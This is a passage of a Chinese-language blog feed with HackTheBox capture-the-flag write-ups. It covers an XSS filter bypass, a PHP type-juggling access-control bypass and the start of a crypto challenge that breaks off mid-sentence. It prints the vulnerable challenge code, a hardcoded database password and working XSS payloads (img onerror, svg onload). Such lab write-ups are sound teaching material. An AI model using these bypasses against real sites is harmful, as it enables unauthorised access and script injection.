    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>我們直接來看主程式：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, abort</span><br><span class="line"><span class="keyword">from</span> flask_socketio <span class="keyword">import</span> SocketIO</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">socketio = SocketIO(app)</span><br><span class="line"></span><br><span class="line">registered_emails, socket_clients = [], &#123;&#125;</span><br><span class="line"></span><br><span class="line">generate = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join([random.choice(string.hexdigits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line">BOT_TOKEN = generate(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_pass</span>(<span class="params">email</span>):</span><br><span class="line">    email = email.lower()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;script&quot;</span> <span class="keyword">in</span> email:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span>, ip <span class="keyword">in</span> socket_clients.items():</span><br><span class="line">        <span class="keyword">if</span> ip == user_ip:</span><br><span class="line">            socketio.emit(<span class="string">&quot;flag&quot;</span>, &#123;<span class="string">&quot;flag&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read()&#125;, room=<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_bot</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">    host, port = <span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span></span><br><span class="line">    HOST = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    options = Options()</span><br><span class="line"></span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-infobars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-background-networking&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-default-apps&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-extensions&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-sync&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-translate&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--hide-scrollbars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--metrics-recording-only&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--mute-audio&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-first-run&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--dns-prefetch-disable&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--safebrowsing-disable-auto-update&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--media-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disk-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--user-agent=HTB/1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    service = Service(executable_path=<span class="string">&quot;/usr/bin/chromedriver&quot;</span>)</span><br><span class="line">    browser = webdriver.Chrome(service=service, options=options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(<span class="string">f&quot;<span class="subst">&#123;HOST&#125;</span>/bot?token=<span class="subst">&#123;BOT_TOKEN&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        WebDriverWait(browser, <span class="number">3</span>).until(EC.alert_is_present())</span><br><span class="line"></span><br><span class="line">        alert = browser.switch_to.alert</span><br><span class="line">        alert.accept()</span><br><span class="line">        send_flag(user_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        registered_emails.clear()</span><br><span class="line">        browser.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/register&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.is_json <span class="keyword">or</span> <span class="keyword">not</span> request.json[<span class="string">&quot;email&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> blacklist_pass(request.json[<span class="string">&quot;email&quot;</span>]):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">401</span>)</span><br><span class="line"></span><br><span class="line">    registered_emails.append(request.json[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">    Thread(target=start_bot, args=(request.remote_addr,)).start()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;success&quot;</span>:<span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>) != BOT_TOKEN:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;bot.html&quot;</span>, emails=registered_emails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;connect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_connect</span>():</span><br><span class="line">    socket_clients[request.sid] = request.remote_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;disconnect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_disconnect</span>():</span><br><span class="line">    <span class="keyword">del</span> socket_clients[request.sid]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>我們可以看到他讓我們註冊信箱，然後會檢查 email 有沒有包含 script 關鍵字，如果我們成功繞過 script 觸發 alert 就會 sendFlag，所以目標就是不含 script 的 XSS。<br>以下放上一些 payload 供參考：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;invalid.jpg&quot;</span> onerror=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/alert_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;我們直接來看主程式：&lt;/p&gt;
&lt;div class=&quot;hig</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="xss" scheme="https://kazma.tw/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Juggling facts Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/</id>
    <published>2024-11-01T17:50:29.643Z</published>
    <updated>2024-11-01T18:28:05.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題是 web，我們逛一下網站後會看到沒有明顯的輸入點，但是有三個按鈕會呈現不同的頁面，我們來看一下 code。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">spl_autoload_register</span>(function (<span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Controller$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;controllers/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Model$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;models/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;$&#123;name&#125;.php&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title class_">Database</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;M@k3l@R!d3s$&#x27;</span>, <span class="string">&#x27;web_juggling_facts&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span> = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;IndexController@index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;/api/getfacts&#x27;</span>, <span class="string">&#x27;IndexController@getfacts&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$router</span>-&gt;<span class="keyword">match</span>());</span><br></pre></td></tr></table></figure></div><p>上面可以看到他設定了兩種路由，一種是 GET &#x2F; 會呼叫 IndexController 類中的 index 方法，另一個是註冊一個 POST 方法的路由，URL 路徑為 &#x2F;api&#x2F;getfacts，當發送 POST 請求至 &#x2F;api&#x2F;getfacts 路徑時，會呼叫 IndexController 類中的 getfacts 方法。那我們接著就看 <code>challenge/controllers/IndexController.php</code>：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">view</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfacts</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$jsondata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;type&#x27;</span>, <span class="variable">$jsondata</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>] === <span class="string">&#x27;secrets&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Currently this type can be only accessed through localhost!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;secrets&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;secrets&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;not_spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;not_spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid type!&#x27;</span></span><br><span class="line">                ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面提到在訪問 &#x2F;api&#x2F;getfacts 的時候會帶一個 type 的參數，根據不同的 case 會有不同的 response，其中有一個 type 是 secrets 他前面先檢查是否是本地存取，否的話就會 return 然後輸出警告。<br>那這邊就要提到 php 的一個問題，就是當我們使用兩個等號做比較的時候會被稱作 loose comparison，因為當兩個類型不同時 php 會嘗試幫我們轉型再做比較。<br>例如，0 &#x3D;&#x3D; ‘0’ 和 0 &#x3D;&#x3D; false 都會返回 true，因為在鬆散比較下 PHP 會將字符串和布爾值轉換成數字進行比較。<br>而當我們使用 &#x3D;&#x3D;&#x3D;：這會是一個 strict comparison，不會進行類型轉換。<br>嚴格比較要求值和類型都必須相同，否則結果為 false。<br>例如，0 &#x3D;&#x3D;&#x3D; ‘0’ 和 0 &#x3D;&#x3D;&#x3D; false 都會返回 false，因為類型不同（數字與字符串或布爾值），PHP 不會嘗試轉換它們。<br>那這邊放上一張圖片給大家參考：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*E-5cStZUndETrKec.png"                      alt="ref"                ><br>圖片來源：<a class="link"   href="https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39" >https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>那我們就可以嘗試找到一個值是會在三個等號時不等於 ‘secrets’ 但是兩個等號會相等的，這種漏洞也叫做 Type Juggling Vulnerability 跟題目呼應，中文可能叫型別強制漏洞。<br>那我們就透過 true 來跟 “secrets” 做比較搭配 burp 來協助我們送封包，效果如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling.png"                      alt="weak"                ></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts" >https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題是 web，我們逛一下網站後會看到沒有明顯的輸入點，但是</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="php" scheme="https://kazma.tw/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SPG Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/</id>
    <published>2024-11-01T10:03:28.954Z</published>
    <updated>2024-11-01T12:09:01.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>首先題目附給我們 <code>source.py</code> 以及 <code>output.txt</code>，其中程式的主邏輯如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, MASTER_KEY</span><br><span class="line"></span><br><span class="line">ALPHABET = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_password</span>():</span><br><span class="line">    master_key = <span class="built_in">int</span>.from_bytes(MASTER_KEY, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> master_key:</span><br><span class="line">        bit = master_key &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> bit:</span><br><span class="line">            password += random.choice(ALPHABET[: <span class="built_in">len</span>(ALPHABET) // <span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password += random.choice(ALPHABET[<span class="built_in">len</span>(ALPHABET) // <span class="number">2</span> :])</span><br><span class="line">        master_key &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    password = generate_password()</span><br><span class="line">    encryption_key = sha256(MASTER_KEY).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(FLAG, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">f&quot;Your Password : <span class="subst">&#123;password&#125;</span>\nEncrypted Flag : <span class="subst">&#123;b64encode(ciphertext).decode()&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>我們來分析一下上面做了些什麼，首先他有一個 <code>generate_password()</code> 的函式把引入的 MASTER_KEY 來生成一組密碼。他先把 MASTER_KEY 用 little_endian 的格式轉成整數，接著從最低位開始若 bit 為 1 則從自定義的字母表前半部分挑一個字符加入 password，反之，若 bit 為 0 就從後半部挑一個字符，然後往高位移動一個重複前面的操作。再來 main 